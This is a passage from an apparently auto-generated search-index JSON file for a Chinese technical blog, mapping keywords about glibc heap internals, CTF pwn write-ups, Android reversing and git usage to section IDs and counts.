"285\":1}}],[\"35下对tls\",{\"1\":{\"157\":1,\"279\":1}}],[\"35下的exit函数打法\",{\"0\":{\"155\":1,\"277\":1}}],[\"3个chunk\",{\"1\":{\"150\":1}}],[\"32\",{\"1\":{\"143\":1,\"144\":1,\"246\":4,\"247\":1,\"264\":1,\"265\":1}}],[\"32位\",{\"1\":{\"142\":1}}],[\"32位是2\",{\"1\":{\"137\":1}}],[\"34019\",{\"1\":{\"265\":1}}],[\"34以上我们没办法使用常规的overlapping\",{\"1\":{\"146\":1}}],[\"34下的合并检查机制\",{\"1\":{\"147\":1}}],[\"34下\",{\"1\":{\"88\":1}}],[\"34\",{\"0\":{\"84\":1},\"1\":{\"85\":1,\"255\":1}}],[\"36\",{\"1\":{\"77\":1}}],[\"3a\",{\"1\":{\"48\":1}}],[\"38\",{\"1\":{\"46\":1}}],[\"37\",{\"1\":{\"46\":1}}],[\"3\",{\"1\":{\"43\":2,\"46\":1,\"47\":2,\"66\":3,\"132\":1,\"143\":1,\"144\":1,\"150\":3,\"151\":1,\"152\":2,\"153\":2,\"154\":8,\"158\":1,\"182\":1,\"189\":1,\"223\":2,\"234\":2,\"239\":1,\"244\":2,\"246\":10,\"247\":1,\"249\":1,\"260\":1,\"264\":1,\"268\":2,\"269\":1,\"273\":2,\"276\":1,\"280\":1,\"288\":2}}],[\"3db8720ecbf5\",{\"1\":{\"43\":2}}],[\"31m\",{\"1\":{\"182\":1}}],[\"31里面引用了key检查\",{\"1\":{\"127\":1}}],[\"31\",{\"1\":{\"42\":1,\"92\":1,\"245\":1,\"246\":1,\"247\":1,\"265\":1}}],[\"2+p64\",{\"1\":{\"276\":1}}],[\"2+n\",{\"1\":{\"234\":1}}],[\"29\",{\"1\":{\"246\":1,\"273\":1}}],[\"290\",{\"1\":{\"150\":1,\"154\":1}}],[\"28355\",{\"1\":{\"256\":1}}],[\"28125\",{\"1\":{\"254\":3,\"255\":2}}],[\"28\",{\"1\":{\"246\":1,\"258\":1}}],[\"28h\",{\"1\":{\"244\":1}}],[\"25\",{\"1\":{\"246\":1}}],[\"256下\",{\"1\":{\"220\":1}}],[\"256\",{\"1\":{\"220\":2}}],[\"21\",{\"1\":{\"246\":1,\"273\":1}}],[\"2存的是\",{\"1\":{\"234\":1}}],[\"2原理\",{\"0\":{\"178\":1}}],[\"2到63是small\",{\"1\":{\"132\":1}}],[\"2^<size\",{\"1\":{\"127\":1}}],[\"2学习笔记\",{\"0\":{\"116\":1}}],[\"264是调试出来的\",{\"1\":{\"290\":1}}],[\"26\",{\"1\":{\"246\":1}}],[\"26开始引入\",{\"1\":{\"123\":1}}],[\"26引入\",{\"1\":{\"115\":1}}],[\"26gx\",{\"1\":{\"72\":3}}],[\"2019072\",{\"1\":{\"273\":1}}],[\"20h\",{\"1\":{\"244\":1}}],[\"2021024\",{\"1\":{\"260\":1}}],[\"2022\",{\"1\":{\"222\":1}}],[\"2024hgameweek3\",{\"0\":{\"140\":1}}],[\"20240422214400338\",{\"1\":{\"267\":1}}],[\"20240422214330654\",{\"1\":{\"267\":1}}],[\"20240422213216922\",{\"1\":{\"265\":1}}],[\"20240422212450209\",{\"1\":{\"262\":1}}],[\"20240422211647867\",{\"1\":{\"259\":1}}],[\"20240422211628353\",{\"1\":{\"259\":1}}],[\"20240422211447696\",{\"1\":{\"259\":1}}],[\"20240422211524070\",{\"1\":{\"259\":1}}],[\"20240422202855033\",{\"1\":{\"258\":1}}],[\"20240428113701938\",{\"1\":{\"225\":1}}],[\"20240428113615977\",{\"1\":{\"225\":1}}],[\"20240421154901421\",{\"1\":{\"216\":1}}],[\"20240421154819197\",{\"1\":{\"216\":1}}],[\"20240421003231028\",{\"1\":{\"216\":1}}],[\"20240425165104955\",{\"1\":{\"181\":1}}],[\"20240425164628090\",{\"1\":{\"177\":1}}],[\"20240423181623582\",{\"1\":{\"175\":1}}],[\"20240423181313898\",{\"1\":{\"174\":1}}],[\"20240423174817889\",{\"1\":{\"172\":1}}],[\"20240423174606432\",{\"1\":{\"172\":1}}],[\"20240423173959024\",{\"1\":{\"172\":1}}],[\"20240423173604690\",{\"1\":{\"170\":1}}],[\"20240423194855564\",{\"1\":{\"171\":1}}],[\"20240423194735581\",{\"1\":{\"171\":1}}],[\"20240420123602766\",{\"1\":{\"163\":1,\"285\":1}}],[\"20240420123457567\",{\"1\":{\"163\":1,\"285\":1}}],[\"20240418151731938\",{\"1\":{\"162\":1,\"284\":1}}],[\"20240418151102406\",{\"1\":{\"161\":1,\"283\":1}}],[\"20240418151026231\",{\"1\":{\"161\":1,\"283\":1}}],[\"20240418134333731\",{\"1\":{\"160\":1,\"282\":1}}],[\"20240418133239908\",{\"1\":{\"158\":1,\"280\":1}}],[\"20240418133015055\",{\"1\":{\"158\":1,\"280\":1}}],[\"20240418132947766\",{\"1\":{\"158\":1,\"280\":1}}],[\"20240418131700409\",{\"1\":{\"156\":1,\"278\":1}}],[\"20240418005523801\",{\"1\":{\"156\":1,\"278\":1}}],[\"20240418005502800\",{\"1\":{\"156\":1,\"278\":1}}],[\"20240418005442527\",{\"1\":{\"156\":1,\"278\":1}}],[\"20240406170144040\",{\"1\":{\"66\":1}}],[\"20240406165914445\",{\"1\":{\"66\":1}}],[\"20240506184605509\",{\"1\":{\"136\":1}}],[\"20240328105736546\",{\"1\":{\"210\":1}}],[\"20240328105659625\",{\"1\":{\"209\":1}}],[\"20240327020644254\",{\"1\":{\"205\":1}}],[\"20240327020501416\",{\"1\":{\"205\":1}}],[\"20240327020322439\",{\"1\":{\"205\":1}}],[\"20240327015402527\",{\"1\":{\"205\":1}}],[\"20240327015201921\",{\"1\":{\"202\":1}}],[\"20240327015022273\",{\"1\":{\"202\":1}}],[\"20240327014539222\",{\"1\":{\"202\":1}}],[\"20240327014215956\",{\"1\":{\"202\":1}}],[\"20240327013056474\",{\"1\":{\"202\":1}}],[\"20240327013607798\",{\"1\":{\"199\":1}}],[\"20240327013517671\",{\"1\":{\"199\":1}}],[\"20240327013258111\",{\"1\":{\"199\":1}}],[\"20240327011904072\",{\"1\":{\"196\":1}}],[\"20240327011540293\",{\"1\":{\"193\":1}}],[\"20240327011453742\",{\"1\":{\"193\":1}}],[\"20240327010609541\",{\"1\":{\"190\":1}}],[\"20240325150321671\",{\"1\":{\"153\":1}}],[\"20240325145825097\",{\"1\":{\"153\":1}}],[\"20240325145741621\",{\"1\":{\"153\":1}}],[\"20240325135125545\",{\"1\":{\"152\":1}}],[\"20240325115900055\",{\"1\":{\"152\":1}}],[\"20240325114920279\",{\"1\":{\"151\":1}}],[\"20240325111521964\",{\"1\":{\"150\":1}}],[\"20240325111430446\",{\"1\":{\"150\":1}}],[\"20240325110339049\",{\"1\":{\"147\":1}}],[\"20240325110240440\",{\"1\":{\"147\":1}}],[\"20240320114400575\",{\"1\":{\"34\":1}}],[\"20240320113426950\",{\"1\":{\"33\":1}}],[\"20240320113131596\",{\"1\":{\"32\":1}}],[\"20240320105839523\",{\"1\":{\"30\":1}}],[\"20240319205119155\",{\"1\":{\"91\":1}}],[\"20240317101823846\",{\"1\":{\"88\":1}}],[\"20240317101747206\",{\"1\":{\"88\":1}}],[\"20240317100413787\",{\"1\":{\"86\":1}}],[\"20240317160934372\",{\"1\":{\"61\":1}}],[\"2024\",{\"0\":{\"84\":1},\"1\":{\"58\":1,\"140\":1}}],[\"20\",{\"1\":{\"77\":2,\"246\":1,\"273\":2,\"289\":1}}],[\"20是存name的\",{\"1\":{\"77\":1}}],[\"2则是1c7036f\",{\"1\":{\"59\":1}}],[\"2mb\",{\"1\":{\"43\":1,\"223\":1}}],[\"2207216\",{\"1\":{\"288\":1}}],[\"2206944\",{\"1\":{\"158\":1,\"280\":1}}],[\"222\",{\"1\":{\"46\":4}}],[\"226\",{\"1\":{\"46\":5}}],[\"22\",{\"1\":{\"43\":1,\"246\":1}}],[\"24之下多了\",{\"1\":{\"212\":1}}],[\"24\",{\"0\":{\"212\":1,\"214\":1},\"1\":{\"43\":1,\"246\":1,\"260\":2}}],[\"2fdocker\",{\"1\":{\"43\":1}}],[\"2fpipe\",{\"1\":{\"43\":1}}],[\"2f\",{\"1\":{\"43\":2}}],[\"23的\",{\"1\":{\"47\":1}}],[\"238\",{\"1\":{\"46\":4}}],[\"23\",{\"0\":{\"208\":1},\"1\":{\"42\":1,\"116\":1,\"246\":1}}],[\"27$p\",{\"1\":{\"258\":1}}],[\"27的源码\",{\"1\":{\"89\":1}}],[\"27下\",{\"1\":{\"88\":1}}],[\"27\",{\"1\":{\"42\":1,\"140\":1,\"142\":1,\"246\":1}}],[\"2\",{\"0\":{\"84\":1,\"208\":1},\"1\":{\"42\":4,\"43\":2,\"46\":1,\"67\":1,\"74\":1,\"85\":1,\"88\":2,\"92\":1,\"97\":2,\"109\":5,\"116\":1,\"124\":3,\"127\":2,\"132\":3,\"136\":1,\"137\":1,\"138\":1,\"143\":1,\"144\":1,\"147\":1,\"150\":3,\"151\":2,\"154\":8,\"157\":1,\"158\":1,\"161\":1,\"163\":1,\"167\":1,\"178\":1,\"182\":6,\"189\":1,\"202\":2,\"212\":1,\"222\":1,\"223\":1,\"234\":1,\"244\":1,\"246\":10,\"247\":1,\"249\":1,\"258\":1,\"260\":3,\"265\":2,\"269\":1,\"273\":1,\"276\":2,\"279\":1,\"280\":1,\"283\":1,\"285\":1,\"288\":2}}],[\"版本\",{\"0\":{\"85\":1}}],[\"版本对应\",{\"0\":{\"42\":1}}],[\"版本号\",{\"1\":{\"37\":1}}],[\"降级\",{\"1\":{\"41\":1}}],[\"复现它的操作发现它的libc版本太低了\",{\"1\":{\"41\":1}}],[\"定义了一些activity的执行方式\",{\"1\":{\"39\":1}}],[\"定义了android\",{\"1\":{\"39\":1}}],[\"根据\",{\"1\":{\"173\":1}}],[\"根据地址我们知道\",{\"1\":{\"153\":1}}],[\"根据注释大概知道是进行完整的插入操作\",{\"1\":{\"106\":1}}],[\"根据文章在android\",{\"1\":{\"38\":1}}],[\"根据类名获取java类\",{\"1\":{\"22\":1}}],[\"往往一些实际项目中我们xml文件中有多个activity标签\",{\"1\":{\"38\":1}}],[\"尤其是activity我们一般都是从activity分析起走\",{\"1\":{\"37\":1}}],[\"列如\",{\"1\":{\"50\":1}}],[\"列举几个逆向中常用的属性\",{\"1\":{\"37\":1}}],[\"列表\",{\"1\":{\"30\":1}}],[\"权限等等\",{\"1\":{\"37\":1}}],[\"应用程序的名称和图标\",{\"1\":{\"37\":1}}],[\"应该是根据指针\",{\"1\":{\"109\":1}}],[\"应该是class\",{\"1\":{\"30\":1}}],[\"应该就是检查下一个chunk是否是合法的\",{\"1\":{\"97\":1}}],[\"应该\",{\"1\":{\"23\":1}}],[\"包括文件的百分比位置等\",{\"1\":{\"249\":1}}],[\"包名\",{\"1\":{\"37\":1}}],[\"包含空格\",{\"1\":{\"251\":1}}],[\"包含512\",{\"1\":{\"223\":1}}],[\"包含四大组件的标签\",{\"1\":{\"37\":1}}],[\"包含全局属性\",{\"1\":{\"37\":1}}],[\"包含\",{\"1\":{\"37\":1}}],[\"主线程对应主分配区\",{\"1\":{\"136\":1}}],[\"主分配区在ptmalloc\",{\"1\":{\"138\":1}}],[\"主分配区放头部\",{\"1\":{\"132\":2}}],[\"主分配区和非主分配区用next形成一个环形链表进行管理\",{\"1\":{\"132\":1}}],[\"主分配区和非主分配区arena的实现\",{\"1\":{\"131\":1}}],[\"主分配区\",{\"0\":{\"132\":1}}],[\"主分支\",{\"0\":{\"53\":1}}],[\"主力pwn环境\",{\"0\":{\"44\":1}}],[\"主题\",{\"1\":{\"37\":1}}],[\"主标签\",{\"0\":{\"37\":1}}],[\"主要就是判断打开模式\",{\"1\":{\"205\":1}}],[\"主要运用在\",{\"1\":{\"130\":1}}],[\"主要通过yield关键字来实现切换控制权\",{\"1\":{\"66\":1}}],[\"主要是构造合法的size\",{\"1\":{\"150\":1}}],[\"主要是看ntustisc\",{\"1\":{\"126\":1}}],[\"主要是看着wiki\",{\"1\":{\"89\":1}}],[\"主要是glibc在高版本下的安全检查机制\",{\"1\":{\"88\":1}}],[\"主要是包含了一些属性\",{\"1\":{\"39\":1}}],[\"主要是说明一些逆向的时候我们需要看的信息\",{\"1\":{\"35\":1}}],[\"主要项目负责人\",{\"0\":{\"6\":1}}],[\"博客园\",{\"1\":{\"36\":1,\"39\":1,\"92\":2,\"235\":1,\"237\":1}}],[\"天涯海角路\",{\"1\":{\"36\":1,\"39\":1}}],[\"65030\",{\"1\":{\"273\":1}}],[\"6的当前绑定地址\",{\"1\":{\"240\":1}}],[\"6b0\",{\"1\":{\"150\":1,\"154\":1}}],[\"64814\",{\"1\":{\"276\":1}}],[\"647\",{\"1\":{\"268\":1}}],[\"64s\",{\"1\":{\"264\":1}}],[\"64472\",{\"1\":{\"258\":1}}],[\"64\",{\"1\":{\"176\":1,\"223\":1,\"234\":1,\"241\":1,\"254\":1,\"288\":2}}],[\"64到126是large\",{\"1\":{\"132\":1}}],[\"64位数量是8\",{\"1\":{\"137\":1}}],[\"64位\",{\"1\":{\"114\":1,\"115\":1,\"142\":1}}],[\"64b\",{\"1\":{\"69\":1}}],[\"6链接库实现\",{\"1\":{\"112\":1}}],[\"619\",{\"1\":{\"46\":1}}],[\"614286773\",{\"1\":{\"58\":1}}],[\"61428\",{\"1\":{\"27\":1}}],[\"66667\",{\"1\":{\"46\":1}}],[\"66800574\",{\"1\":{\"36\":1}}],[\"6\",{\"1\":{\"46\":1,\"150\":4,\"151\":2,\"152\":3,\"153\":2,\"154\":9,\"158\":1,\"161\":2,\"163\":2,\"165\":5,\"182\":1,\"241\":3,\"245\":1,\"246\":2,\"247\":5,\"249\":1,\"276\":5,\"280\":1,\"283\":2,\"285\":2,\"287\":5,\"288\":2}}],[\"6711535f8c6a\",{\"1\":{\"43\":1}}],[\"63\",{\"1\":{\"43\":1}}],[\"分为三种大小\",{\"1\":{\"223\":1}}],[\"分别是缓冲区chunk的开头和末尾\",{\"1\":{\"216\":1}}],[\"分割大chunk\",{\"1\":{\"150\":1}}],[\"分配后整个结构体转为char使用\",{\"1\":{\"223\":1}}],[\"分配在不同的page上\",{\"1\":{\"223\":1}}],[\"分配空间\",{\"1\":{\"188\":1}}],[\"分配对应大小的空间\",{\"1\":{\"188\":1}}],[\"分配一个heap\",{\"1\":{\"138\":1}}],[\"分配区空闲链表\",{\"1\":{\"132\":1}}],[\"分配区链表\",{\"1\":{\"132\":2}}],[\"分配区全局链表\",{\"1\":{\"132\":2}}],[\"分配区heap\",{\"1\":{\"131\":1}}],[\"分配区状态机malloc\",{\"1\":{\"131\":1}}],[\"分配操作\",{\"0\":{\"94\":1}}],[\"分支管理\",{\"0\":{\"52\":1}}],[\"分析与利用\",{\"1\":{\"157\":1,\"279\":1}}],[\"分析一下题\",{\"0\":{\"77\":1}}],[\"分析\",{\"0\":{\"31\":1}}],[\"分享\",{\"1\":{\"28\":1}}],[\"r8d\",{\"1\":{\"268\":1}}],[\"r9d\",{\"1\":{\"268\":1}}],[\"rip=syscall\",{\"1\":{\"290\":4}}],[\"rip\",{\"1\":{\"268\":1}}],[\"rb=\",{\"1\":{\"266\":1}}],[\"rbp+24\",{\"1\":{\"268\":2}}],[\"rbp\",{\"1\":{\"231\":1,\"244\":6,\"254\":2,\"255\":1,\"258\":2}}],[\"rpath\",{\"1\":{\"238\":1,\"241\":2}}],[\"rdi=1\",{\"1\":{\"290\":1}}],[\"rdi=3\",{\"1\":{\"290\":1}}],[\"rdi=bss\",{\"1\":{\"290\":1}}],[\"rdi=0\",{\"1\":{\"290\":1}}],[\"rdi+p64\",{\"1\":{\"288\":4,\"289\":2}}],[\"rdi\",{\"1\":{\"234\":1,\"268\":10,\"288\":1,\"289\":1}}],[\"rdx=0x36\",{\"1\":{\"290\":2}}],[\"rdx=0x700\",{\"1\":{\"290\":1}}],[\"rdx=0\",{\"1\":{\"290\":1}}],[\"rdx+p64\",{\"1\":{\"289\":2}}],[\"rdx\",{\"1\":{\"96\":1,\"234\":2,\"268\":1,\"288\":4,\"289\":1}}],[\"rsp+p64\",{\"1\":{\"288\":1}}],[\"rsp+2ch\",{\"1\":{\"254\":1,\"255\":1}}],[\"rsp+28h\",{\"1\":{\"244\":1}}],[\"rsp+20h\",{\"1\":{\"244\":1}}],[\"rsp+18h\",{\"1\":{\"244\":1}}],[\"rsp+10h\",{\"1\":{\"244\":1}}],[\"rsp+4h\",{\"1\":{\"244\":1}}],[\"rsp+0h\",{\"1\":{\"244\":1,\"254\":1}}],[\"rsp向下跑一下\",{\"1\":{\"231\":1}}],[\"rsp向下移动一格\",{\"1\":{\"231\":1}}],[\"rsp\",{\"1\":{\"231\":1,\"234\":1,\"258\":1,\"268\":2,\"288\":1,\"290\":4}}],[\"rsp定位的\",{\"1\":{\"231\":1}}],[\"rsi=0\",{\"1\":{\"290\":1}}],[\"rsi=bss+0x400\",{\"1\":{\"290\":2}}],[\"rsi=bss\",{\"1\":{\"290\":1}}],[\"rsi+p64\",{\"1\":{\"288\":4,\"289\":2}}],[\"rsi\",{\"1\":{\"96\":1,\"234\":2,\"268\":7,\"288\":1,\"289\":1}}],[\"rw\",{\"1\":{\"189\":1}}],[\"raw\",{\"1\":{\"249\":1}}],[\"rax=1\",{\"1\":{\"290\":1}}],[\"rax=2\",{\"1\":{\"290\":1}}],[\"rax=0\",{\"1\":{\"290\":2}}],[\"rax\",{\"1\":{\"234\":5,\"255\":3,\"258\":4,\"268\":15}}],[\"ra\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"random\",{\"1\":{\"127\":1}}],[\"range\",{\"1\":{\"66\":2,\"90\":1,\"98\":2,\"103\":1,\"105\":1,\"106\":1,\"109\":1,\"129\":1,\"143\":3,\"144\":2,\"158\":2,\"161\":3,\"163\":4,\"165\":8,\"260\":6,\"265\":1,\"273\":8,\"276\":8,\"280\":2,\"283\":3,\"285\":4,\"287\":8,\"288\":22}}],[\"ru\",{\"1\":{\"154\":1,\"165\":1,\"258\":5,\"260\":6,\"264\":2,\"265\":6,\"266\":3,\"267\":2,\"268\":5,\"269\":6,\"271\":2,\"273\":7,\"276\":11,\"287\":1,\"288\":15,\"289\":2,\"290\":1}}],[\"runpath会ld忽略ld\",{\"1\":{\"238\":1}}],[\"runpath再去寻找dt\",{\"1\":{\"238\":1}}],[\"runpath\",{\"1\":{\"238\":1}}],[\"runtime\",{\"0\":{\"235\":1},\"1\":{\"234\":8,\"235\":2}}],[\"running\",{\"1\":{\"43\":2}}],[\"run\",{\"1\":{\"41\":1,\"43\":2}}],[\"rl\",{\"1\":{\"154\":1,\"258\":2,\"260\":1,\"264\":1,\"265\":2,\"266\":2,\"267\":1,\"268\":1,\"269\":3,\"271\":1,\"273\":1,\"276\":1,\"288\":2,\"289\":1,\"290\":1}}],[\"rcx\",{\"1\":{\"234\":2,\"268\":5,\"288\":1}}],[\"rc\",{\"1\":{\"154\":1,\"258\":1,\"260\":2,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":2,\"276\":2,\"288\":2,\"289\":1,\"290\":1}}],[\"r\",{\"1\":{\"143\":17,\"144\":17,\"236\":9,\"249\":1,\"256\":5,\"288\":2}}],[\"r12+p64\",{\"1\":{\"288\":3}}],[\"r12\",{\"1\":{\"288\":1}}],[\"r11\",{\"1\":{\"96\":2}}],[\"r10\",{\"1\":{\"96\":1,\"268\":3}}],[\"rodata\",{\"1\":{\"255\":1}}],[\"roderickchan\",{\"1\":{\"47\":1}}],[\"routine\",{\"1\":{\"243\":3}}],[\"ropgadget\",{\"1\":{\"230\":1}}],[\"rom\",{\"1\":{\"219\":1}}],[\"rol\",{\"1\":{\"165\":2,\"287\":2,\"288\":2}}],[\"root\",{\"1\":{\"46\":2}}],[\"rtt\",{\"1\":{\"46\":1}}],[\"rncallpythonretobj\",{\"1\":{\"30\":1}}],[\"rep\",{\"1\":{\"220\":1,\"267\":1}}],[\"replace\",{\"1\":{\"182\":1,\"241\":1}}],[\"replaced\",{\"1\":{\"134\":1,\"138\":2}}],[\"repeat\",{\"1\":{\"137\":2}}],[\"repository\",{\"1\":{\"43\":1}}],[\"reused\",{\"0\":{\"139\":1},\"1\":{\"134\":1,\"137\":1,\"138\":1}}],[\"reg\",{\"1\":{\"246\":1,\"255\":1}}],[\"regular\",{\"1\":{\"109\":1}}],[\"register\",{\"1\":{\"64\":1}}],[\"recvall\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"recvline\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"recv\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":6,\"271\":1,\"273\":6,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"recvuntil\",{\"1\":{\"143\":6,\"144\":6,\"154\":1,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"recent\",{\"1\":{\"132\":1}}],[\"recently\",{\"1\":{\"132\":1}}],[\"received\",{\"1\":{\"46\":1}}],[\"record\",{\"1\":{\"109\":2,\"124\":1}}],[\"reduce\",{\"1\":{\"109\":1}}],[\"redundant\",{\"1\":{\"71\":1}}],[\"redo\",{\"1\":{\"109\":1,\"124\":1}}],[\"rerouted\",{\"1\":{\"106\":1}}],[\"remainder\",{\"0\":{\"106\":1},\"1\":{\"98\":16,\"106\":16,\"132\":2}}],[\"removing\",{\"1\":{\"106\":1}}],[\"remove\",{\"1\":{\"64\":1,\"138\":3,\"165\":2,\"287\":2,\"288\":1}}],[\"remote\",{\"1\":{\"27\":1,\"154\":1,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"real\",{\"1\":{\"220\":1}}],[\"read函数\",{\"1\":{\"268\":1,\"290\":1}}],[\"readfsqword\",{\"1\":{\"244\":1}}],[\"read\",{\"1\":{\"134\":1,\"138\":1,\"175\":4,\"180\":6,\"186\":2,\"193\":10,\"195\":3,\"268\":1,\"288\":1,\"289\":1}}],[\"readme规范学习\",{\"0\":{\"1\":1}}],[\"reached\",{\"1\":{\"109\":2}}],[\"reasons\",{\"1\":{\"71\":1}}],[\"revert的注意事项\",{\"0\":{\"60\":1}}],[\"revert的类型\",{\"0\":{\"59\":1}}],[\"revert是用一个新的commit\",{\"1\":{\"58\":1}}],[\"revert和git\",{\"1\":{\"58\":1}}],[\"revert原因\",{\"0\":{\"58\":1}}],[\"revert用法\",{\"1\":{\"57\":1}}],[\"revert\",{\"1\":{\"57\":1,\"59\":2,\"61\":1}}],[\"reviewer\",{\"1\":{\"55\":1}}],[\"review\",{\"0\":{\"54\":1}}],[\"relro\",{\"1\":{\"254\":2}}],[\"reloc\",{\"0\":{\"236\":1},\"1\":{\"234\":4,\"235\":1,\"236\":2}}],[\"rel\",{\"1\":{\"109\":1,\"124\":1,\"236\":9}}],[\"relay\",{\"1\":{\"224\":2,\"226\":2}}],[\"relaxed\",{\"1\":{\"109\":2}}],[\"related\",{\"1\":{\"0\":1}}],[\"release\",{\"1\":{\"55\":1,\"109\":1}}],[\"refactor\",{\"1\":{\"50\":1}}],[\"requested\",{\"1\":{\"138\":1}}],[\"request\",{\"1\":{\"43\":1,\"46\":7,\"132\":1,\"138\":1}}],[\"re\",{\"0\":{\"305\":1},\"1\":{\"27\":1,\"109\":1}}],[\"ret2\",{\"1\":{\"289\":1}}],[\"ret2dl\",{\"0\":{\"232\":1}}],[\"retfq无法跳转4字节以上的地址\",{\"1\":{\"268\":1}}],[\"retfq\",{\"1\":{\"268\":3}}],[\"ret指令的地方\",{\"1\":{\"231\":1}}],[\"ret\",{\"1\":{\"231\":2,\"234\":1,\"258\":1,\"289\":1,\"290\":1}}],[\"ret这个gadget将esp劫持到fake\",{\"1\":{\"230\":1}}],[\"retry\",{\"1\":{\"43\":1,\"136\":2}}],[\"retval\",{\"1\":{\"23\":1,\"243\":2}}],[\"return\",{\"1\":{\"17\":1,\"19\":6,\"30\":2,\"32\":1,\"75\":1,\"90\":1,\"98\":1,\"100\":2,\"107\":1,\"109\":1,\"127\":1,\"136\":1,\"137\":1,\"138\":2,\"143\":1,\"144\":1,\"188\":3,\"204\":1,\"213\":1,\"224\":2,\"226\":2,\"244\":1,\"254\":2,\"255\":1,\"260\":1,\"269\":2,\"273\":1,\"276\":3,\"288\":7}}],[\"resolve部分详细解说\",{\"0\":{\"235\":1}}],[\"resolve函数\",{\"1\":{\"234\":2}}],[\"resolve\",{\"1\":{\"234\":6,\"235\":2}}],[\"reserve\",{\"1\":{\"175\":2,\"193\":2,\"223\":1}}],[\"reset通常是直接删除\",{\"1\":{\"58\":1}}],[\"reset的区别\",{\"1\":{\"58\":1}}],[\"result\",{\"1\":{\"65\":2,\"109\":1,\"266\":3}}],[\"resuming\",{\"1\":{\"27\":1}}],[\"res\",{\"1\":{\"17\":3,\"19\":3,\"158\":3,\"163\":1,\"165\":6,\"258\":3,\"260\":4,\"264\":2,\"269\":2,\"273\":4,\"276\":6,\"280\":3,\"285\":1,\"287\":6,\"288\":8}}],[\"哈哈哈哈\",{\"1\":{\"30\":1}}],[\"出现在函数内部\",{\"1\":{\"66\":1}}],[\"出现了报错\",{\"1\":{\"30\":1}}],[\"出来\",{\"1\":{\"6\":1}}],[\"初始化\",{\"0\":{\"194\":1},\"1\":{\"188\":2,\"195\":1}}],[\"初始化分配区锁\",{\"1\":{\"138\":1}}],[\"初始化mstate\",{\"1\":{\"138\":1}}],[\"初始化一个新的分配区arena\",{\"1\":{\"138\":1}}],[\"初步探索\",{\"0\":{\"30\":1}}],[\"初次体验\",{\"0\":{\"28\":1}}],[\"使用此选项后\",{\"1\":{\"249\":1}}],[\"使用解析后的地址跳转执行目标函数\",{\"1\":{\"234\":1}}],[\"使用git\",{\"0\":{\"58\":1,\"60\":1}}],[\"使用以及理解\",{\"1\":{\"57\":1}}],[\"使用指令\",{\"1\":{\"30\":1}}],[\"使用详解\",{\"1\":{\"28\":1}}],[\"使用java平台\",{\"1\":{\"16\":1,\"17\":1}}],[\"使用java的平台\",{\"0\":{\"16\":1}}],[\"安全资讯平台\",{\"1\":{\"157\":1,\"279\":1}}],[\"安全客\",{\"1\":{\"157\":1,\"279\":1}}],[\"安全检查\",{\"1\":{\"106\":3}}],[\"安全检查机制\",{\"0\":{\"97\":1,\"147\":1}}],[\"安全社区|安全招聘|kanxue\",{\"1\":{\"28\":1,\"41\":1,\"157\":1,\"167\":1,\"178\":1,\"182\":1,\"279\":1}}],[\"安装和使用\",{\"0\":{\"4\":1}}],[\"留着后天来写\",{\"1\":{\"27\":1}}],[\">0x14514000\",{\"1\":{\"268\":1}}],[\">劫持程序流程\",{\"1\":{\"231\":1}}],[\">栈迁移\",{\"1\":{\"231\":1}}],[\">peak\",{\"1\":{\"224\":2,\"226\":2}}],[\">prev\",{\"1\":{\"97\":2,\"130\":1}}],[\">wd\",{\"1\":{\"188\":1,\"195\":1}}],[\">lock\",{\"1\":{\"188\":1}}],[\">last\",{\"1\":{\"98\":2}}],[\">vtable\",{\"1\":{\"182\":1}}],[\">overflow\",{\"1\":{\"173\":1}}],[\">old\",{\"1\":{\"109\":1}}],[\">>12\",{\"1\":{\"288\":1}}],[\">>>\",{\"1\":{\"165\":1,\"260\":1,\"273\":1,\"276\":4,\"287\":1,\"288\":6}}],[\">>\",{\"1\":{\"154\":1,\"288\":1}}],[\">max\",{\"1\":{\"138\":1}}],[\">mutex\",{\"1\":{\"109\":4,\"124\":2,\"134\":1,\"136\":3,\"138\":2}}],[\">next\",{\"1\":{\"127\":1,\"134\":2,\"138\":5,\"224\":2,\"226\":1,\"227\":1}}],[\">entries\",{\"1\":{\"127\":1}}],[\">key\",{\"1\":{\"127\":1}}],[\">stderr\",{\"1\":{\"188\":2}}],[\">size\",{\"1\":{\"124\":2,\"130\":1,\"138\":2,\"224\":4,\"226\":2,\"227\":2}}],[\">system\",{\"1\":{\"97\":3,\"109\":3,\"124\":3,\"138\":1}}],[\">attached\",{\"1\":{\"138\":2}}],[\">addr\",{\"1\":{\"124\":1}}],[\">ar\",{\"1\":{\"109\":1,\"138\":2}}],[\">64bytes\",{\"1\":{\"115\":1}}],[\">have\",{\"1\":{\"109\":2}}],[\">top\",{\"1\":{\"109\":7}}],[\">=\",{\"1\":{\"106\":1,\"109\":6,\"124\":2,\"137\":1,\"195\":1,\"213\":1,\"247\":1}}],[\">free\",{\"1\":{\"224\":5,\"226\":3,\"227\":2}}],[\">file\",{\"1\":{\"202\":6}}],[\">fp\",{\"1\":{\"188\":7,\"195\":1,\"198\":1,\"201\":1,\"202\":1,\"204\":1}}],[\">func\",{\"1\":{\"179\":1,\"180\":1}}],[\">fwd\",{\"1\":{\"104\":1}}],[\">fd成功\",{\"1\":{\"154\":1}}],[\">fd都是p\",{\"1\":{\"130\":1}}],[\">fd等于bk\",{\"1\":{\"129\":1}}],[\">fd